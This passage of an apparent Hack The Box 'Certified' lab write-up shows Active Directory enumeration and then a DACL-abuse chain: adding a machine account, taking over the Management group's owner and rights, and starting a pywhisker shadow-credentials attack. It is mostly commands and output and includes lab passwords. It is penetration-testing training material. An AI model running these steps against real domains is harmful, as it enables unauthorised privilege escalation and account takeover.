└─$ mkdir -p ldeep && ldeep ldap -u "$(pt get user)" -p "$(pt get pass)" -d "$(pt get domain)" -s ldap://$(pt get ip) all ldeep/
[+] Retrieving auth_policies output
[+] Retrieving auth_policies verbose output
[+] Retrieving bitlockerkeys output
[+] Retrieving bitlockerkeys verbose output
[+] Retrieving computers output
[+] Retrieving conf output
[+] Retrieving delegations output
[...]
```

- Overview
	- **ADCS** is enabled

```bash
┌──(bravosec㉿fsociety)-[~/htb/Certified]
└─$ find ldeep/*.lst -type f -size +0c -not -path '*_conf.lst' -exec ls -lS {} +
-rw-r--r-- 1 bravosec kali 31674 Feb 19 23:52 ldeep/_templates.lst
-rw-r--r-- 1 bravosec kali  1066 Feb 19 23:52 ldeep/_groups.lst
-rw-r--r-- 1 bravosec kali   321 Feb 19 23:52 ldeep/_domain_policy.lst
-rw-r--r-- 1 bravosec kali   220 Feb 19 23:52 ldeep/_fsmo.lst
-rw-r--r-- 1 bravosec kali   154 Feb 19 23:52 ldeep/_ou.lst
-rw-r--r-- 1 bravosec kali   136 Feb 19 23:52 ldeep/_gpo.lst
-rw-r--r-- 1 bravosec kali   112 Feb 19 23:52 ldeep/_users_all.lst
-rw-r--r-- 1 bravosec kali   105 Feb 19 23:52 ldeep/_users_nopasswordexpire.lst
-rw-r--r-- 1 bravosec kali    99 Feb 19 23:52 ldeep/_users_enabled.lst
-rw-r--r-- 1 bravosec kali    21 Feb 19 23:52 ldeep/_delegations_all.lst
-rw-r--r-- 1 bravosec kali    21 Feb 19 23:52 ldeep/_delegations_unconstrained.lst
-rw-r--r-- 1 bravosec kali    19 Feb 19 23:52 ldeep/_computers.lst
-rw-r--r-- 1 bravosec kali    19 Feb 19 23:52 ldeep/_pkis.lst
-rw-r--r-- 1 bravosec kali    15 Feb 19 23:52 ldeep/_users_spn.lst
-rw-r--r-- 1 bravosec kali    14 Feb 19 23:52 ldeep/_zones.lst
-rw-r--r-- 1 bravosec kali    13 Feb 19 23:52 ldeep/_users_disabled.lst
-rw-r--r-- 1 bravosec kali     6 Feb 19 23:52 ldeep/_machines.lst
-rw-r--r-- 1 bravosec kali     6 Feb 19 23:52 ldeep/_users_passwordnotrequired.lst
```

- Users info

```bash
cat ldeep/*_users_all.json | jq 'map(del(.cn,.accountExpires,.badPasswordTime,.badPwdCount,.c,.codePage,.company,.countryCode,.dSCorePropagationData,.dn,.givenName,.instanceType,.l,.lastLogoff,.lastLogon,.logonCount,.mail,.name,.objectCategory,.objectClass,.objectGUID,.objectSid,.postalCode,.primaryGroupID,.sAMAccountType,.sn,.st,.streetAddress,.uSNChanged,.uSNCreated,.whenChanged,.whenCreated,.memberOf,.logonHours,.isCriticalSystemObject,.showInAdvancedViewOnly,.lockoutTime,.nTSecurityDescriptor,.initials,.pwdLastSet)) | sort_by(.lastLogonTimestamp)'| sed -E -e 's/DONT_REQUIRE|servicePrincipalName|NOTREQD/\x1b[31m&\x1b[0m/ig' -e 's/DONT_EXPIRE/\x1b[33m&\x1b[0m/ig' -e 's/displayName|distinguishedName|lastLogonTimestamp|sAMAccountName|userAccountControl|userPrincipalName/\x1b[36m&\x1b[0m/ig'
```

```bash
[
  {
    "displayName": "Gregory Cameron",
    "distinguishedName": "CN=Gregory Cameron,CN=Users,DC=certified,DC=htb",
    "sAMAccountName": "gregory.cameron",
    "userAccountControl": "NORMAL_ACCOUNT | DONT_EXPIRE_PASSWORD",
    "userPrincipalName": "gregory.cameron@certified.htb"
  },
  {
    "displayName": "Harry Wilson",
    "distinguishedName": "CN=Harry Wilson,CN=Users,DC=certified,DC=htb",
    "sAMAccountName": "harry.wilson",
    "userAccountControl": "NORMAL_ACCOUNT | DONT_EXPIRE_PASSWORD",
    "userPrincipalName": "harry.wilson@certified.htb"
  },
  {
    "displayName": "Alexander Huges",
    "distinguishedName": "CN=Alexander Huges,CN=Users,DC=certified,DC=htb",
    "sAMAccountName": "alexander.huges",
    "userAccountControl": "NORMAL_ACCOUNT | DONT_EXPIRE_PASSWORD",
    "userPrincipalName": "alexander.huges@certified.htb"
  },
  {
    "adminCount": 1,
    "description": [
      "Key Distribution Center Service Account"
    ],
    "distinguishedName": "CN=krbtgt,CN=Users,DC=certified,DC=htb",
    "msDS-SupportedEncryptionTypes": 0,
    "sAMAccountName": "krbtgt",
    "servicePrincipalName": [
      "kadmin/changepw"
    ],
    "userAccountControl": "ACCOUNTDISABLE | NORMAL_ACCOUNT"
  },
  {
    "description": [
      "Built-in account for guest access to the computer/domain"
    ],
    "distinguishedName": "CN=Guest,CN=Users,DC=certified,DC=htb",
    "sAMAccountName": "Guest",
    "userAccountControl": "ACCOUNTDISABLE | PASSWD_NOTREQD | NORMAL_ACCOUNT | DONT_EXPIRE_PASSWORD"
  },
  {
    "adminCount": 1,
    "description": [
      "Built-in account for administering the computer/domain"
    ],
    "distinguishedName": "CN=Administrator,CN=Users,DC=certified,DC=htb",
    "lastLogonTimestamp": "2025-02-19T02:44:34.763052+00:00",
    "sAMAccountName": "Administrator",
    "userAccountControl": "NORMAL_ACCOUNT | DONT_EXPIRE_PASSWORD"
  },
  {
    "displayName": "Judith Mader",
    "distinguishedName": "CN=Judith Mader,CN=Users,DC=certified,DC=htb",
    "lastLogonTimestamp": "2025-02-19T04:29:09.367735+00:00",
    "msDS-SupportedEncryptionTypes": 0,
    "sAMAccountName": "judith.mader",
    "userAccountControl": "NORMAL_ACCOUNT | DONT_EXPIRE_PASSWORD",
    "userPrincipalName": "judith.mader@certified.htb"
  },
  {
    "displayName": "management service",
    "distinguishedName": "CN=management service,CN=Users,DC=certified,DC=htb",
    "lastLogonTimestamp": "2025-02-19T12:12:52.992687+00:00",
    "sAMAccountName": "management_svc",
    "servicePrincipalName": [
      "certified.htb/management_svc.DC01"
    ],
    "userAccountControl": "NORMAL_ACCOUNT | DONT_EXPIRE_PASSWORD",
    "userPrincipalName": "management_svc@certified.htb"
  },
  {
    "displayName": "Operator CA",
    "distinguishedName": "CN=operator ca,CN=Users,DC=certified,DC=htb",
    "lastLogonTimestamp": "2025-02-19T12:13:08.602062+00:00",
    "sAMAccountName": "ca_operator",
    "userAccountControl": "NORMAL_ACCOUNT | DONT_EXPIRE_PASSWORD",
    "userCertificate": [
      "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"
    ],
    "userPrincipalName": "ca_operator@certified.htb"
  }
]
```

- `ca_operator` has certificate enabled

![](/assets/obsidian/850e21de55d762fa7bb08cf20df639aa.png)

- Group users by group

```bash
┌──(bravosec㉿fsociety)-[~/htb/Certified]
└─$ cat ldeep/*_users_all.json | jq 'map(select(.memberOf != null)) | reduce .[] as $item ({}; reduce $item.memberOf[] as $group (.; .[$group] = (.[$group] // []) + [$item.sAMAccountName]))'
{
  "CN=Management,CN=Users,DC=certified,DC=htb": [
    "management_svc"
  ],
  "CN=Remote Management Users,CN=Builtin,DC=certified,DC=htb": [
    "management_svc"
  ],
  "CN=Denied RODC Password Replication Group,CN=Users,DC=certified,DC=htb": [
    "krbtgt"
  ],
  "CN=Guests,CN=Builtin,DC=certified,DC=htb": [
    "Guest"
  ],
  "CN=Group Policy Creator Owners,CN=Users,DC=certified,DC=htb": [
    "Administrator"
  ],
  "CN=Domain Admins,CN=Users,DC=certified,DC=htb": [
    "Administrator"
  ],
  "CN=Enterprise Admins,CN=Users,DC=certified,DC=htb": [
    "Administrator"
  ],
  "CN=Schema Admins,CN=Users,DC=certified,DC=htb": [
    "Administrator"
  ],
  "CN=Administrators,CN=Builtin,DC=certified,DC=htb": [
    "Administrator"
  ]
}
```


### User access check


#### Bloodhound

`JUDITH.MADER` owns `Management` group, which includes the member `management_svc` who has remote **WINRM** privilege

![](/assets/obsidian/338a90b8f445974fa16da039fd1c1f5b.png)

`Management` group has `GenericWrite` rights over the user `management_svc`

![](/assets/obsidian/940ab5ce3e0b4571cc7e49e2bf060303.png)


#### SMB shares

Share folders only contain default files

```bash
┌──(bravosec㉿fsociety)-[~/htb/Certified]
└─$ nxc smb $(pt get rhost) -u "$(pt get user)" -p "$(pt get pass)" -M spider_plus --smb-timeout 10
SMB         10.10.11.41     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.41     445    DC01             [+] certified.htb\judith.mader:judith09
SPIDER_PLUS 10.10.11.41     445    DC01             [*] Started module spidering_plus with the following options:
SPIDER_PLUS 10.10.11.41     445    DC01             [*]  DOWNLOAD_FLAG: False
SPIDER_PLUS 10.10.11.41     445    DC01             [*]     STATS_FLAG: True
SPIDER_PLUS 10.10.11.41     445    DC01             [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS 10.10.11.41     445    DC01             [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS 10.10.11.41     445    DC01             [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS 10.10.11.41     445    DC01             [*]  OUTPUT_FOLDER: /home/kali/.nxc/modules/nxc_spider_plus
SMB         10.10.11.41     445    DC01             [*] Enumerated shares
SMB         10.10.11.41     445    DC01             Share           Permissions     Remark
SMB         10.10.11.41     445    DC01             -----           -----------     ------
SMB         10.10.11.41     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.41     445    DC01             C$                              Default share
SMB         10.10.11.41     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.41     445    DC01             NETLOGON        READ            Logon server share
SMB         10.10.11.41     445    DC01             SYSVOL          READ            Logon server share
SPIDER_PLUS 10.10.11.41     445    DC01             [+] Saved share-file metadata to "/home/kali/.nxc/modules/nxc_spider_plus/10.10.11.41.json".
SPIDER_PLUS 10.10.11.41     445    DC01             [*] SMB Shares:           5 (ADMIN$, C$, IPC$, NETLOGON, SYSVOL)
SPIDER_PLUS 10.10.11.41     445    DC01             [*] SMB Readable Shares:  3 (IPC$, NETLOGON, SYSVOL)
SPIDER_PLUS 10.10.11.41     445    DC01             [*] SMB Filtered Shares:  1
SPIDER_PLUS 10.10.11.41     445    DC01             [*] Total folders found:  16
SPIDER_PLUS 10.10.11.41     445    DC01             [*] Total files found:    5
SPIDER_PLUS 10.10.11.41     445    DC01             [*] File size average:    1.58 KB
SPIDER_PLUS 10.10.11.41     445    DC01             [*] File size min:        22 B
SPIDER_PLUS 10.10.11.41     445    DC01             [*] File size max:        4.07 KB
```

```bash
┌──(bravosec㉿fsociety)-[~/htb/Certified]
└─$ cat "/home/kali/.nxc/modules/nxc_spider_plus/$(pt get ip).json" | jq -r 'to_entries[] | .key as $top_level | .value | to_entries[]? | select(.value | type == "object") | {file_path: ($top_level + "/" + .key), atime: (.value.atime_epoch // "N/A"), size: (.value.size // "N/A")}' | jq -s -r 'sort_by(.atime)[] | [.file_path, .atime, .size] | @tsv' | column -t -s $'\t'
SYSVOL/certified.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol                              2024-05-13 23:25:53  2.73 KB
SYSVOL/certified.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI                                           2024-05-13 23:29:12  22 B
SYSVOL/certified.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf  2024-05-13 23:29:12  1.07 KB
SYSVOL/certified.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI                                           2024-05-15 00:17:03  22 B
SYSVOL/certified.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf  2024-05-15 00:17:03  4.07 KB
```


### DACL Abuse - Add controlled user to Management group

We can add workstations to domain

```bash
┌──(bravosec㉿fsociety)-[~/htb/Certified]
└─$ nxc ldap $(pt get rhost) -u "$(pt get user)" -p "$(pt get pass)" -M maq
LDAP        10.10.11.41     389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:certified.htb)
LDAP        10.10.11.41     389    DC01             [+] certified.htb\judith.mader:judith09
MAQ         10.10.11.41     389    DC01             [*] Getting the MachineAccountQuota
MAQ         10.10.11.41     389    DC01             MachineAccountQuota: 10
```

Add a computer account to abuse **DACL** in a more **opsec-safe** way

```bash
┌──(bravosec㉿fsociety)-[~/htb/Certified]
└─$ addcomputer.py -computer-name 'Test' -dc-host "$(pt get dc_fqdn)" "$(pt get domain)"/"$(pt get user)":"$(pt get pass)"
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Successfully added machine account Test$ with password GceANlGxCaY7ppwTxeYowXPOFJcqjn3M.
```

Change the **owner** of `MANAGEMENT` group to `judith.mader`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Certified]
└─$ owneredit.py -action write -new-owner 'judith.mader' -target-dn 'CN=MANAGEMENT,CN=USERS,DC=CERTIFIED,DC=HTB' "$(pt get domain)"/"$(pt get user)":"$(pt get pass)"
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Current owner information below
[*] - SID: S-1-5-21-729746778-2675978091-3820388244-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=certified,DC=htb
[*] OwnerSid modified successfully!
```

Grant  `Test$` computer account the privilege to add members to `Management` group

```bash
┌──(bravosec㉿fsociety)-[~/htb/Certified]
└─$ dacledit.py -action 'write' -rights 'WriteMembers' -principal 'Test$' -target-dn 'CN=Management,CN=Users,DC=certified,DC=htb' "$(pt get domain)"/"$(pt get user)":"$(pt get pass)"
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] DACL backed up to dacledit-20250223-003633.bak
[*] DACL modified successfully!
```

Add `Test$` computer account to `Management` group

```bash
┌──(bravosec㉿fsociety)-[~/htb/Certified]
└─$ pt set user 'Test$'; pt set pass 'GceANlGxCaY7ppwTxeYowXPOFJcqjn3M'; echo "$(pt get user):$(pt get pass)" | anew creds.lst
Test$:GceANlGxCaY7ppwTxeYowXPOFJcqjn3M

┌──(bravosec㉿fsociety)-[~/htb/Certified]
└─$ net rpc group addmem "Management" 'Test$' -U "$(pt get domain)"/"$(pt get user)"%"$(pt get pass)" -S "$(pt get ip)"

┌──(bravosec㉿fsociety)-[~/htb/Certified]
└─$ 
```


### DACL Abuse - Shadow Credentials attack

Add shadow credentials for `management_svc`

```bash
┌──(bravosec㉿fsociety)-[~/htb/Certified]
└─$ pywhisker -d "$(pt get domain)" -u "$(pt get user)" -p "$(pt get pass)" --target "management_svc" --action "add"
[*] Searching for the target account
[*] Target user found: CN=management service,CN=Users,DC=certified,DC=htb
